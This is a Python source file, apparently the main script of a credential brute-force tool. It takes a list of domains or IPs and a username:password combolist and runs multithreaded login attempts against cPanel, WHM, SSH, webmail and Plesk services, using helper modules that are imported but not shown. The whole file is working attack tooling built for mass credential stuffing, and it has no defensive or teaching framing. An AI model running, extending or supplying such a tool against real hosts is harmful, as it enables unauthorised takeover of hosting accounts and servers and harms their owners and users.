# Author: Pari Malam

import os
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from modules.banners import banners
from modules.utils import setup_logging, ip_to_domain
from modules.cpanel_whm import check_cpanel, check_whm, crack_cpanel
from modules.ssh import check_ssh
from modules.plesk import check_plesk
from modules.webmail import check_webmail, check_webmail_path

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

logger = setup_logging()

FR = Fore.RED
FY = Fore.YELLOW
FW = Fore.WHITE
FG = Fore.GREEN
FC = Fore.CYAN

if not os.path.exists('Results'):
    os.mkdir('Results')


def parse_combolist(path):
    combos = []
    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '|' in line:
                parts = line.split('|', 1)
            elif ':' in line:
                parts = line.split(':', 1)
            else:
                logger.warning(f"[!] Invalid combo format: {line}")
                continue
            if len(parts) == 2:
                username, password = parts
                combos.append((username.strip(), password.strip()))
    return combos


def detect_services(url):
    domain = url.replace("https://", "").replace("http://", "")
    services = {}
    try:
        services["cpanel"] = check_cpanel(domain)
        services["whm"] = check_whm(domain)
        services["webmail"] = check_webmail_path(domain)
        services["plesk"] = True
    except Exception as e:
        logger.error(f"[!] Service check failed for {domain}: {e}")
    return services


def bruteforce_domain(url, combos):
    domain = url.replace("https://", "").replace("http://", "")
    logger.info(f"[→] Scanning: {url}")
    services = detect_services(url)
    for username, password in combos:
        try:
            if username.lower() == "root":
                check_ssh(domain, username, password)
            elif "@" in username:
                if services.get("webmail"):
                    check_webmail(domain, username, password)
            else:
                if services.get("cpanel") or services.get("whm"):
                    crack_cpanel(domain, username, password)
                if services.get("plesk"):
                    check_plesk(domain, username, password)
        except Exception as e:
            logger.error(f"[!] Bruteforce error for {domain} ({username}): {e}")


def resolve_and_start(entry, combos):
    if any(c.isalpha() for c in entry):
        url = f"https://{entry}"
    else:
        domain = ip_to_domain(entry)
        if not domain:
            logger.warning(f"[-] Skipping {entry}, could not resolve to domain")
            return
        url = f"https://{domain}"
        logger.info(f"[+] Resolved {entry} → {url}")

    bruteforce_domain(url, combos)


def main():
    parser = argparse.ArgumentParser(description='Brute force cPanel, WHM, SSH, Webmail, and Plesk logins.')
    parser.add_argument('-f', '--file', required=True, help='Path to the file containing domains or IPs')
    parser.add_argument('-c', '--combolist', required=True, help='Path to the combo file (username:password or email:password)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    args = parser.parse_args()

    combos = parse_combolist(args.combolist)
    if not combos:
        logger.error("No valid combos found.")
        return

    with open(args.file, 'r', encoding='utf-8') as f:
        entries = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(resolve_and_start, entry, combos) for entry in entries]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"[!] Thread error: {e}")


if __name__ == "__main__":
    banners()
    main()
